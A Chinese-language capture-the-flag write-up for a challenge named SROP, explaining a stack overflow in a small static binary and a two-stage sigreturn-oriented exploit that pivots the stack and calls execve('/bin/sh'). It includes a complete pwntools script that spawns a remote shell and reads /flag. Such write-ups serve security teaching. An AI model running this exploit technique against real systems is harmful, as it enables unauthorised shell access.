# SROP

## 题目简述

静态汇编程序在栈上只预留 `0x50` 字节，却读取 `0x400` 字节。它随后寻找输入中的第一个 NUL，并把此前内容写回；`write` 的返回值会留在 `rax`。令第一个 NUL 位于偏移 15，可把 `rax` 精确设为 `rt_sigreturn` 系统调用号 15，再返回到 `syscall; ret`，由伪造信号帧控制全部寄存器。

## 解题过程

关键地址来自附件反汇编：

```text
syscall; ret = 0x40100a
repeater     = 0x401021
staging rsp  = 0x402800
```

`repeater` 的行为可概括为：

```asm
sub rsp, 0x50
read(0, rsp, 0x400)
rbp = 第一个 NUL 的下标
write(1, rsp, rbp)   ; 返回值 rax = rbp
add rsp, 0x50
ret
```

第一阶段把返回地址覆盖为 `0x40100a`，并在其后放置 `SigreturnFrame`。前 15 字节非零、第 16 字节为零，使回显 `write` 返回 15；执行 `syscall` 时内核按 `rt_sigreturn` 解析栈上帧。第一帧设置一次 `read(0, 0x402800, 0x1000)`，并把新栈迁移到 `0x402800`。

向该 read 发送 `p64(0x401021)` 后，`syscall; ret` 的 `ret` 会从新栈取出 `repeater` 地址。`repeater` 再次读取第二阶段；此时其输入缓冲区是 `0x402800 - 8 - 0x50 = 0x4027b8`，所以放在偏移 16 的 `/bin/sh\0` 地址为 `0x4027c8`。

第二次同样令 `rax=15`，第二个信号帧设置 `execve("/bin/sh", 0, 0)`：

```python
from pwn import SigreturnFrame, context, flat, remote

context(arch="amd64", os="linux")
io = remote("HOST", PORT)

SYSCALL_RET = 0x40100A
REPEATER = 0x401021
STAGE_STACK = 0x402800
SECOND_BUFFER = 0x4027B8
BIN_SH = SECOND_BUFFER + 0x10


def trigger_prefix():
    # 第一个 NUL 位于下标 15，使 write 返回 15
    return (b"A" * 15).ljust(0x50, b"\x00")


# 第一帧：read(0, 0x402800, 0x1000)，并迁移栈
frame1 = SigreturnFrame()
frame1.rax = 0
frame1.rdi = 0
frame1.rsi = STAGE_STACK
frame1.rdx = 0x1000
frame1.rip = SYSCALL_RET
frame1.rsp = STAGE_STACK

stage1 = trigger_prefix() + flat(SYSCALL_RET) + bytes(frame1)
io.sendafter(b"Hello> ", stage1)

# read 把下一次 ret 的目标写到新栈
io.send(flat(REPEATER))

# 第二帧：execve("/bin/sh", 0, 0)
frame2 = SigreturnFrame()
frame2.rax = 59
frame2.rdi = BIN_SH
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = SYSCALL_RET
frame2.rsp = STAGE_STACK

stage2_data = b"A" * 15 + b"\x00" + b"/bin/sh\x00"
stage2 = stage2_data.ljust(0x50, b"\x00")
stage2 += flat(SYSCALL_RET) + bytes(frame2)
io.sendafter(b"Hello> ", stage2)

io.sendline(b"cat /flag")
io.interactive()
```

仓库中的 `build/flag` 只有本地占位值 `flag{test}`，不是比赛实例 flag；真实结果应以远程 `/flag` 为准。

## 方法总结

SROP 的关键是同时获得 `syscall` 指令、把 `rax` 设为 15 的方法，以及可控信号帧。本题利用回显长度设置 `rax`，第一帧完成栈迁移和二次读取，第二帧再执行 `execve`，把一次不够用的原语拆成两个稳定阶段。
